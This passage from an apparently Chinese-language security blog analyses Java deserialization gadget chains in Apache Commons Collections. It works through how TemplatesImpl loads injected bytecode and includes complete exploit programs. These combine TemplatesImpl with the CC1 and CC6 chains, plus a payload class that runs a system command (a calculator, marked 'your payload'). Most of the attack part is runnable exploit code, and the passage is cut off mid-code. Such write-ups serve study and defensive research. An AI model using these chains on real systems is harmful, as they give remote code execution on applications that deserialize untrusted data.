<code>protected</code>，我们需要找到作用域为 <code>public</code> 的类，方便我们利用。</p><p>在 <code>TemplatesImpl</code> 类的 <code>static class TransletClassLoader</code> 中找到了我们能够运用的类。</p><p><img src="/img/CC3/c01.png"></p><p>此处是一个default方法</p><p>继续查找用法</p><p>来到同一个类中的defineTransletClasses方法，但是这个方法是一个private方法</p><p><img src="/img/CC3/c02.png"></p><p>继续跟进，来到还是同一个类下的 <code>getTransletInstance()</code> 方法</p><p>调用了 <code>defineTransletClasses()</code> 方法，并且这里有一个 <code>newInstance()</code> 实例化的过程，如果能走完这个函数那么就能动态执行代码</p><p><img src="/img/CC3/c03.png"></p><p>但是它是私有的，所以继续找</p><p>找到一个public方法</p><p><img src="/img/CC3/c04.png"></p><h2 id="TemplatesImpl-利用"><a href="#TemplatesImpl-利用" class="headerlink" title="TemplatesImpl 利用"></a>TemplatesImpl 利用</h2><p>在分析过程我们说到只要走过 <code>getTransletInstance()</code> 方法即可，因为这个方法内调用了 <code>newInstance()</code> 方法，用伪代码来表示的话如下。</p><p>这个类是继承了Serializable接口的，可以序列化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>templates.newTransformer();  <span class="hljs-comment">// 因为是一层层调用的，我们需要后续赋值</span><br></code></pre></td></tr></table></figure><p>跟进到getTransletInstance方法查看代码执行条件</p><p>_name不为空， _class为空</p><p><img src="/img/CC3/c05.png"></p><p>继续跟进</p><p>_bytecodes不为空， _tfactory不为空</p><p><img src="/img/CC3/c06.png"></p><h3 id="编写EXP"><a href="#编写EXP" class="headerlink" title="编写EXP"></a>编写EXP</h3><ul><li><code>_bytecodes</code>构造</li></ul><p><code>_bytecodes</code> 的值，这里需要的是一个二维数组，所以我们创建一个二维数组。但是 <code>_bytecodes</code> 作为传递进 defineClass 方法的值是一个一维数组。而这个一维数组里面我们需要存放恶意的字节码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D://Test.class&quot;</span>));<br><span class="hljs-type">byte</span>[][] codes=&#123;code&#125;;<br>bytecodes.set(templates,codes);<br></code></pre></td></tr></table></figure><p>测试用java文件，要编译为Class文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br>        <span class="hljs-keyword">static</span> &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>            &#125; <span class="hljs-keyword">catch</span> (IOException e)&#123;<br>                e.printStackTrace();<br>            &#125;<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><code>_tfactory</code> 构造</li></ul><p><code>_tfactory</code> 的值在 <code>TemplatesImpl</code> 这一类中被定义如下，关键字是 <code>transient</code>，这就导致了这个变量在序列化之后无法被访问。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">transient</span> <span class="hljs-type">TransformerFactoryImpl</span> <span class="hljs-variable">_tfactory</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br></code></pre></td></tr></table></figure><p>直接修改是不行的，但是我们这里的利用要求比较低，只要让 <code>_tfactory</code> 不为 null 即可，我们去看一看 <code>_tfactory</code> 的其他定义如何。</p><p>在 <code>readObject()</code> 方法中，找到了 <code>_tfactory</code> 的初始化定义。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">_tfactory = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>();<br></code></pre></td></tr></table></figure><p>只要满足这个条件即可</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Field</span> <span class="hljs-variable">tfactory</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>tfactory.setAccessible(<span class="hljs-literal">true</span>);<br>tfactory.set(templates,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br></code></pre></td></tr></table></figure><p>此时的EXP</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.TransformerConfigurationException;<br><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC3EXP</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> TransformerConfigurationException, NoSuchFieldException, IllegalAccessException, IOException &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br><br>        <span class="hljs-comment">//反射修改属性值</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        name.setAccessible(<span class="hljs-literal">true</span>);<br>        name.set(templates,<span class="hljs-string">&quot;a&quot;</span>);<br><br>        <span class="hljs-comment">//defineClass方法会将此字节码转化为Class对象</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodes</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">//构造读取字节码</span><br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D://Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes=&#123;code&#125;;<br>        bytecodes.set(templates,codes);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactory</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactory.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactory.set(templates,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br><br>        templates.newTransformer();<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>运行后有报错</p><p><img src="/img/CC3/c07.png"></p><h3 id="报错解决"><a href="#报错解决" class="headerlink" title="报错解决"></a>报错解决</h3><p>根据报错提示，我们来到defineTransletClasses方法，下一个断点</p><p>发现问题出在if语句中条件未满足</p><p>如果我们传入字节码对象的父类不为ABSTRACT_TRANSLET，会直接抛出异常</p><p><img src="/img/CC3/c08.png"></p><p>我们让Test类继承AbstractTranslet就可以</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>); <span class="hljs-comment">// 你的payload</span><br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>编译</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">javac -<span class="hljs-built_in">source</span> 8 -target 8 Test.java<br></code></pre></td></tr></table></figure><p>再运行即可弹出计算器</p><p><img src="/img/CC3/c09.png"></p><h2 id="CC1-链的-TemplatesImpl-的实现方式"><a href="#CC1-链的-TemplatesImpl-的实现方式" class="headerlink" title="CC1 链的 TemplatesImpl 的实现方式"></a>CC1 链的 TemplatesImpl 的实现方式</h2><blockquote><p>TemplatesImpl 只是将原本的命令执行变成代码执行的方式所以在不考虑黑名单的情况下，如果可以进行命令执行，则一定可以通过动态加载字节码进行代码执行。</p></blockquote><p>将CC1改为代码执行的方式</p><p><img src="https://drun1baby.top/2022/06/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8704-CC3%E9%93%BE/Diff.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//反射调用newTransformer</span><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(templates),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        chainedTransformer.transform(<span class="hljs-number">1</span>);<br></code></pre></td></tr></table></figure><p>最后一句，传入 <code>chainedTransformer.transform(1)</code> 是因为前面我们定义了 <code>new ConstantTransformer(templates)</code>，这个类是需要我们传参的，传入 1 即可。</p><p>这里是可以弹出计算器的</p><p>那我们与CC1前半段链子结合</p><p>EXP</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC1EXPTemplatesImpl</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">templatesClass</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates, <span class="hljs-string">&quot;a&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D://Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;evil&#125;;<br>        bytecodesField.set(templates, codes);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        <span class="hljs-comment">// templates.newTransformer();</span><br><br>        <span class="hljs-comment">//反射调用newTransformer</span><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(templates),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-comment">//chainedTransformer.transform(1);</span><br><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        map.put(<span class="hljs-string">&quot;value&quot;</span>, <span class="hljs-string">&quot;aaa&quot;</span>);<br><br>        <span class="hljs-comment">// 装饰为 TransformedMap</span><br>        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(map, <span class="hljs-literal">null</span>, chainedTransformer);<br><br>        <span class="hljs-comment">// 构造 AnnotationInvocationHandler</span><br>        Class&lt;?&gt; c = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; aihConstructor = c.getDeclaredConstructor(Class.class, Map.class);<br>        aihConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> aihConstructor.newInstance(Target.class, transformedMap);<br><br>        <span class="hljs-comment">// 触发序列化 + 反序列化</span><br>        serialize(o);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>        oos.close();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        ois.close();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/CC3/c10.png"></p><h2 id="CC6-链的-TemplatesImpl-的实现方式"><a href="#CC6-链的-TemplatesImpl-的实现方式" class="headerlink" title="CC6 链的 TemplatesImpl 的实现方式"></a>CC6 链的 TemplatesImpl 的实现方式</h2><p>CC6也同理，只需要更改反射调用的方法即可</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC6EXPTemplatesImpl</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">templatesClass</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates, <span class="hljs-string">&quot;a&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D://Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;evil&#125;;<br>        bytecodesField.set(templates, codes);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        <span class="hljs-comment">// templates.newTransformer();</span><br><br>        <span class="hljs-comment">//反射调用newTransformer</span><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(templates),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-comment">//chainedTransformer.transform(1);</span><br><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-comment">//先传入一个没有用的transformer</span><br>        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br><br>        <span class="hljs-comment">//新建TiedMapEntry实例</span><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;aaa&quot;</span>);<br>        tiedMapEntry.getValue();<br><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">hashMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        hashMap.put(tiedMapEntry,<span class="hljs-string">&quot;bbb&quot;</span>);<br><br>        lazyMap.remove(<span class="hljs-string">&quot;aaa&quot;</span>);<br><br>        <span class="hljs-comment">//反射修改lazyMap的参数factory的值</span><br>        Class&lt;LazyMap&gt; lazyMapClass = LazyMap.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">factory</span> <span class="hljs-operator">=</span> lazyMapClass.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>        factory.setAccessible(<span class="hljs-literal">true</span>);<br>        factory.set(lazyMap,chainedTransformer);<br><br><br>        <span class="hljs-comment">// 触发序列化 + 反序列化</span><br>        serialize(hashMap);<br>        unserialize(<span 